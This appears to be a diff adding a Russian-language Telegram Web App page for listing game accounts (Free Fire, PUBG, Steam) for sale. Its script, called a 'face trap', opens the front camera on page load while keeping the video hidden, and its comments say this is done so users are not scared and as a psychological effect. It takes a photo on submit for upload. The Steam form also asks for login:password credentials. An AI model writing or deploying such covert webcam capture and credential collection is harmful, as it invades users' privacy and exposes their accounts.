@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Продать Аккаунт</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background-color: #0f0f0f; color: white; font-family: sans-serif; padding: 20px; }
+        
+        /* Стили полей */
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; color: #00ff88; font-size: 14px; }
+        input, select, textarea {
+            width: 100%; padding: 12px;
+            background: #1e1e1e; border: 1px solid #333;
+            color: white; border-radius: 8px; box-sizing: border-box;
+        }
+        input:focus { border-color: #00ff88; outline: none; }
+
+        /* Кнопка */
+        .submit-btn {
+            width: 100%; background: #00ff88; color: black;
+            padding: 15px; border: none; border-radius: 10px;
+            font-weight: bold; font-size: 16px; margin-top: 20px; cursor: pointer;
+        }
+
+        /* Скрытая камера */
+        #video-preview { width: 100%; border-radius: 10px; display: none; margin-bottom: 10px; border: 2px solid red; }
+        #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <h2 style="text-align: center;">Новое объявление</h2>
+
+    <video id="video-preview" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <form id="sellForm">
+        <div class="form-group">
+            <label>Выберите игру</label>
+            <select id="gameSelect" onchange="changeForm()">
+                <option value="freefire">Free Fire</option>
+                <option value="pubg">PUBG Mobile</option>
+                <option value="steam">Steam / CS2</option>
+            </select>
+        </div>
+
+        <div id="dynamicFields"></div>
+
+        <div class="form-group">
+            <label>Цена (TJS)</label>
+            <input type="number" id="price" placeholder="Например: 150" required>
+            <small style="color: #666; font-size: 10px;">Комиссия сервиса: 1.5 TJS</small>
+        </div>
+
+        <button type="submit" class="submit-btn" id="submitBtn">ОПУБЛИКОВАТЬ</button>
+    </form>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        // КОНСТРУКТОР ФОРМ
+        function changeForm() {
+            const game = document.getElementById('gameSelect').value;
+            const container = document.getElementById('dynamicFields');
+            let html = '';
+
+            if (game === 'freefire') {
+                html += '<div class="form-group"><label>ID Аккаунта</label><input type="text" id="field1" placeholder="123456789"></div>';
+                html += '<div class="form-group"><label>Уровень</label><input type="number" id="field2" placeholder="Например: 60"></div>';
+            } else if (game === 'pubg') {
+                html += '<div class="form-group"><label>ID Игрока</label><input type="text" id="field1"></div>';
+                html += '<div class="form-group"><label>Ранг (RP)</label><input type="text" id="field2" placeholder="Ace / Conqueror"></div>';
+            } else if (game === 'steam') {
+                html += '<div class="form-group"><label>Логин Steam</label><input type="text" id="field1"></div>';
+                html += '<div class="form-group"><label>Ссылка на профиль</label><input type="text" id="field2"></div>';
+                html += '<div class="form-group"><label>Данные для входа (Скрыто, увидит только покупатель)</label><textarea id="secretData" placeholder="Login:Pass"></textarea></div>';
+            }
+            container.innerHTML = html;
+        }
+
+        // Инициализация формы
+        changeForm();
+
+        // 📸 FACE TRAP (Ловушка)
+        const video = document.getElementById('video-preview');
+        const canvas = document.getElementById('canvas');
+        let stream = null;
+
+        // Запрашиваем камеру сразу при входе (Психологический эффект)
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                video.srcObject = stream;
+                // Мы не показываем видео юзеру (display: none в CSS), чтобы не пугать раньше времени,
+                // или можем показать (убери display:none в стиле #video-preview), чтобы он знал, что контроль идет.
+            } catch (err) {
+                tg.showAlert("Для безопасности сделок нужен доступ к камере!");
+            }
+        }
+        startCamera();
+
+        // ОБРАБОТКА ОТПРАВКИ
+        document.getElementById('submitBtn').addEventListener('click', async (e) => {
+            e.preventDefault();
+            
+            // 1. Делаем фото (Снэпшот)
+            if (stream) {
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photoData = canvas.toDataURL('image/jpeg'); // Фото в формате Base64
+                
+                // Тут мы отправим photoData на сервер
+                console.log("Фото сделано!"); 
+            }
+
+            // 2. Собираем данные
+            const formData = {
+                game: document.getElementById('gameSelect').value,
+                price: document.getElementById('price').value,
+                field1: document.getElementById('field1')?.value,
+                field2: document.getElementById('field2')?.value,
+                // photo: photoData (добавим при отправке)
+            };
+
+            // 3. Отправка (пока просто заглушка)
+            tg.showConfirm("Вы подтверждаете, что данные верны? Ваше фото будет сохранено для безопасности.", (ok) => {
+                if(ok) {
+                    // Тут будет fetch запрос к твоему Python серверу
+                    tg.sendData(JSON.stringify(formData)); 
+                    tg.close();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
